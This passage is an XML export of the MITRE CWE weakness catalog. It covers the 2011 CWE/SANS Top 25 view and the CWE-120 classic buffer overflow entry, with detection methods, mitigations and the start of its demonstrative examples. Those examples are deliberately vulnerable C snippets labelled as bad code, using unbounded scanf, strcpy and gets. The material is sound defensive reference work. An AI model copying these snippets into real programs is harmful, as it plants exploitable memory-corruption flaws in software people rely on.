<?xml version="1.0" encoding="UTF-8"?>
            <Weakness_Catalog xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Catalog_Name="VIEW LIST: CWE-900: Weaknesses in the 2011 CWE/SANS Top 25 Most Dangerous Software Errors" Catalog_Version="2.10" Catalog_Date="2017-01-19" xsi:noNamespaceSchemaLocation="http://cwe.mitre.org/data/xsd/cwe_schema_v5.4.2.xsd"><Views xmlns:capec="http://capec.mitre.org/capec-2">
                    <View ID="900" Name="Weaknesses in the 2011 CWE/SANS Top 25 Most Dangerous Software Errors" Status="Incomplete">
         <View_Structure>Graph</View_Structure>
         <View_Objective>
            <Text>CWE entries in this view (graph) are listed in the 2011 CWE/SANS Top 25 Most
					Dangerous Software Errors.</Text>
         </View_Objective>
         <View_Audience>
            <Audience>
               <Stakeholder>Developers</Stakeholder>
               <Stakeholder_Description>
                  <Text>By following the Top 25, developers will be able to significantly
							reduce the number of weaknesses that occur in their software.</Text>
               </Stakeholder_Description>
            </Audience>
            <Audience>
               <Stakeholder>Software_Customers</Stakeholder>
               <Stakeholder_Description>
                  <Text>If a software developer claims to be following the Top 25, then
							customers can use the weaknesses in this view in order to formulate
							independent evidence of that claim.</Text>
               </Stakeholder_Description>
            </Audience>
            <Audience>
               <Stakeholder>Educators</Stakeholder>
               <Stakeholder_Description>
                  <Text>Educators can use this view in multiple ways. For example, if there is
							a focus on teaching weaknesses, the educator could focus on the Top
							25.</Text>
               </Stakeholder_Description>
            </Audience>
         </View_Audience>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>HasMember</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>HasMember</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>HasMember</Relationship_Nature>
               <Relationship_Target_ID>865</Relationship_Target_ID>
               <!--2011 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>HasMember</Relationship_Nature>
               <Relationship_Target_ID>864</Relationship_Target_ID>
               <!--2011 Top 25 - Insecure Interaction Between Components--></Relationship>
         </Relationships>
         <References>
            <Reference>
               <Reference_Title>2011 CWE/SANS Top 25 Most Dangerous Software
						Errors</Reference_Title>
               <Reference_Date>2011-06-27</Reference_Date>
               <Reference_Link>http://cwe.mitre.org/top25</Reference_Link>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2011-06-25</Submission_Date>
            </Submission>
         </Content_History>
      </View></Views><Categories xmlns:capec="http://capec.mitre.org/capec-2">
                    <Category ID="864" Name="2011 Top 25 - Insecure Interaction Between Components" Status="Incomplete">
         <Description>
            <Description_Summary>Weaknesses in this category are listed in the "Insecure
					Interaction Between Components" section of the 2011 CWE/SANS Top 25 Most
					Dangerous Software Errors.</Description_Summary>
         </Description>
         <References>
            <Reference>
               <Reference_Title>2011 CWE/SANS Top 25 Most Dangerous Software
						Errors</Reference_Title>
               <Reference_Date>2011-06-27</Reference_Date>
               <Reference_Link>http://cwe.mitre.org/top25</Reference_Link>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2011-06-25</Submission_Date>
            </Submission>
         </Content_History>
      </Category>
                    <Category ID="865" Name="2011 Top 25 - Risky Resource Management" Status="Incomplete">
         <Description>
            <Description_Summary>Weaknesses in this category are listed in the "Risky Resource
					Management" section of the 2011 CWE/SANS Top 25 Most Dangerous Software
					Errors.</Description_Summary>
         </Description>
         <References>
            <Reference>
               <Reference_Title>2011 CWE/SANS Top 25 Most Dangerous Software
						Errors</Reference_Title>
               <Reference_Date>2011-06-27</Reference_Date>
               <Reference_Link>http://cwe.mitre.org/top25</Reference_Link>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2011-06-25</Submission_Date>
            </Submission>
         </Content_History>
      </Category>
                    <Category ID="866" Name="2011 Top 25 - Porous Defenses" Status="Incomplete">
         <Description>
            <Description_Summary>Weaknesses in this category are listed in the "Porous Defenses"
					section of the 2011 CWE/SANS Top 25 Most Dangerous Software
					Errors.</Description_Summary>
         </Description>
         <References>
            <Reference>
               <Reference_Title>2011 CWE/SANS Top 25 Most Dangerous Software
						Errors</Reference_Title>
               <Reference_Date>2011-06-27</Reference_Date>
               <Reference_Link>http://cwe.mitre.org/top25</Reference_Link>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2011-06-25</Submission_Date>
            </Submission>
         </Content_History>
      </Category>
                    <Category ID="867" Name="2011 Top 25 - Weaknesses On the Cusp" Status="Incomplete">
         <Description>
            <Description_Summary>Weaknesses in this category are not part of the general Top 25,
					but they were part of the original nominee list from which the Top 25 was
					drawn.</Description_Summary>
         </Description>
         <References>
            <Reference>
               <Reference_Title> 2011 CWE/SANS Top 25 Most Dangerous Software
						Errors</Reference_Title>
               <Reference_Date>2011-06-27</Reference_Date>
               <Reference_Link>http://cwe.mitre.org/top25</Reference_Link>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2011-06-25</Submission_Date>
            </Submission>
         </Content_History>
      </Category></Categories><Weaknesses xmlns:capec="http://capec.mitre.org/capec-2">
                    <Weakness ID="120" Name="Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The program copies an input buffer to an output buffer without
					verifying that the size of the input buffer is less than the size of the output
					buffer, leading to a buffer overflow.</Description_Summary>
            <Extended_Description>
               <Text>A buffer overflow condition exists when a program attempts to put more
						data in a buffer than it can hold, or when a program attempts to put data in
						a memory area outside of the boundaries of a buffer. The simplest type of
						error, and the most common cause of buffer overflows, is the "classic" case
						in which the program copies the buffer without restricting how much is
						copied. Other variants exist, but the existence of a classic overflow
						strongly suggests that the programmer is not considering even the most basic
						of security protections.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>865</Relationship_Target_ID>
               <!--2011 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>119</Relationship_Target_ID>
               <!--Improper Restriction of Operations within the Bounds of a Memory Buffer--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>722</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A1 - Unvalidated Input--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>726</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A5 - Buffer Overflows--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>123</Relationship_Target_ID>
               <!--Write-what-where Condition--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">631</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>633</Relationship_Target_ID>
               <!--Weaknesses that Affect Memory--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>20</Relationship_Target_ID>
               <!--Improper Input Validation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>741</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 07 - Characters and Strings (STR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>875</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 07 - Characters and Strings (STR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>970</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Faulty Buffer Access--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>At the code level, stack-based and heap-based overflows do not differ
						significantly, so there usually is not a need to distinguish them. From the
						attacker perspective, they can be quite different, since different
						techniques are required to exploit them.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language Language_Name="C"/>
               <Language Language_Name="C++"/>
               <Language Language_Name="Assembly"/>
            </Languages>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>buffer overrun</Term>
               <Alternate_Term_Description>
                  <Text>Some prominent vendors and researchers use the term "buffer overrun,"
							but most people use "buffer overflow."</Text>
               </Alternate_Term_Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Unbounded Transfer</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Terminology_Notes>
            <Terminology_Note>
               <Text>Many issues that are now called "buffer overflows" are substantively
						different than the "classic" overflow, including entirely different bug
						types that rely on overflow exploit techniques, such as integer signedness
						errors, integer overflows, and format string bugs. This imprecise
						terminology can make it difficult to determine which variant is being
						reported.</Text>
            </Terminology_Note>
         </Terminology_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>High to Very High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Buffer overflows often can be used to execute arbitrary code, which is
							usually outside the scope of a program's implicit security policy. This
							can often be used to subvert any other security service.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: resource consumption
						(CPU)</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Buffer overflows generally lead to crashes. Other attacks leading to
							lack of availability are possible, including putting the program into an
							infinite loop.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can often be detected using automated static analysis
							tools. Many modern tools use data flow analysis or constraint-based
							techniques to minimize the number of false positives.</Text>
                  <Text>Automated static analysis generally does not account for environmental
							considerations when reporting out-of-bounds memory operations. This can
							make it difficult for users to determine which warnings should be
							investigated first. For example, an analysis tool might report buffer
							overflows that originate from command line arguments in a program that
							is not expected to run with setuid or other special privileges.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>Detection techniques for buffer-related errors are more mature than
							for most other weakness types.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-9">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>Manual analysis can be useful for finding this weakness, but it might
							not achieve desired code coverage within limited time constraints. This
							becomes difficult for weaknesses that must be considered for all inputs,
							since the attack surface can be too large.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Strategy>Language Selection</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a language that does not allow this weakness to occur or provides
							constructs that make this weakness easier to avoid.</Text>
                  <Text>For example, many languages that perform their own memory management,
							such as Java and Perl, are not subject to buffer overflows. Other
							languages, such as Ada and C#, typically provide overflow protection,
							but the protection can be disabled by the programmer.</Text>
                  <Text>Be wary that a language's interface to native code may still be
							subject to overflows, even if the language itself is theoretically safe.
						</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.1">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>Examples include the Safe C String Library (SafeStr) by Messier and
							Viega [R.120.4], and the Strsafe.h library from Microsoft [R.120.3].
							These libraries provide safer versions of overflow-prone string-handling
							functions.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution, since many buffer overflows are not
							related to strings.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-10">
               <Mitigation_Phase>Build and Compilation</Mitigation_Phase>
               <Mitigation_Strategy>Compilation or Build Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run or compile the software using features or extensions that
							automatically provide a protection mechanism that mitigates or
							eliminates buffer overflows.</Text>
                  <Text>For example, certain compilers and extensions provide automatic buffer
							overflow detection mechanisms that are built into the compiled code.
							Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat
							FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not necessarily a complete solution, since these mechanisms
							can only detect certain types of overflows. In addition, an attack could
							still cause a denial of service, since the typical response is to exit
							the application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-9">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Consider adhering to the following rules when allocating and managing
							an application's memory:</Text>
                  <Block Block_Nature="List">
                     <Text>Double check that your buffer is as large as you specify.</Text>
                     <Text>When using functions that accept a number of bytes to copy, such
								as strncpy(), be aware that if the destination buffer size is equal
								to the source buffer size, it may not NULL-terminate the
								string.</Text>
                     <Text>Check buffer boundaries if accessing the buffer in a loop and make
								sure you are not in danger of writing past the allocated
								space.</Text>
                     <Text>If necessary, truncate all input strings to a reasonable length
								before passing them to the copy and concatenation functions.</Text>
                  </Block>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-11">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run or compile the software using features or extensions that randomly
							arrange the positions of a program's executable and libraries in memory.
							Because this makes the addresses unpredictable, it can prevent an
							attacker from reliably jumping to exploitable code.</Text>
                  <Text>Examples include Address Space Layout Randomization (ASLR) [R.120.5]
							[R.120.7] and Position-Independent Executables (PIE) [R.120.14].</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution. However, it forces the attacker to
							guess an unknown value that changes every program execution. In
							addition, an attack could still cause a denial of service, since the
							typical response is to exit the application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-12">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a CPU and operating system that offers Data Execution Protection
							(NX) or its equivalent [R.120.7] [R.120.9].</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution, since buffer overflows could be used
							to overwrite nearby variables to modify the software's state in
							dangerous ways. In addition, it cannot be used in cases in which
							self-modifying code is required. Finally, an attack could still cause a
							denial of service, since the typical response is to exit the
							application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Build and Compilation</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Most mitigating technologies at the compiler or OS level to date
							address only a subset of buffer overflow problems and rarely provide
							complete protection against even that subset. It is good practice to
							implement strategies to increase the workload of an attacker, such as
							leaving the attacker to guess an unknown value that changes every
							program execution.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-13">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Replace unbounded copy functions with analogous functions that support
							length arguments, such as strcpy with strncpy. Create these if they are
							not available.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This approach is still susceptible to calculation errors, including
							issues such as off-by-one errors (CWE-193) and incorrectly calculating
							buffer lengths (CWE-131).</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Enforcement by Conversion</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.120.10]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Causal_Nature>Explicit</Causal_Nature>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code asks the user to enter their last name and then
						attempts to store the value entered in the last_name array. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>char last_name[20];</Code>
                     <Code>printf ("Enter your last name: ");</Code>
                     <Code>scanf ("%s", last_name);</Code>
                  </Block>
                  <Text>The problem with the code above is that it does not restrict or limit
							the size of the name entered by the user. If the user enters
							"Very_very_long_last_name" which is 24 characters long, then a buffer
							overflow will occur since the array can only hold 20 characters total.
						</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-6">
               <Intro_Text>The following code attempts to create a local copy of a buffer to
						perform some manipulations to the data.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>void manipulate_string(char* string){</Code>
                     <Block>
                        <Code>char buf[24];</Code>
                        <Code>strcpy(buf, string);</Code>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, the programmer does not ensure that the size of the data
							pointed to by string will fit in the local buffer and blindly copies the
							data with the potentially dangerous strcpy() function. This may result
							in a buffer overflow condition if an attacker can influence the contents
							of the string parameter.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-5">
               <Intro_Text>The excerpt below calls the gets() function in C, which is
						inherently unsafe.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Block>
                        <Code>char buf[24];</Code>
                        <Code>printf("Please enter your name and press
									&lt;Enter&gt;\n");</Code>
                        <Code>gets(buf);</Code>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, the programmer uses the function gets() which is inherently
							unsafe because it blindly copies all input from STDIN to the buffer
							without restricting how much is copied. This allows the user to provide
							a string that is larger than the buffer size, resulting in an overflow
							condition.</Text>
               </Example_Body>
            </Demonstrative_Example>
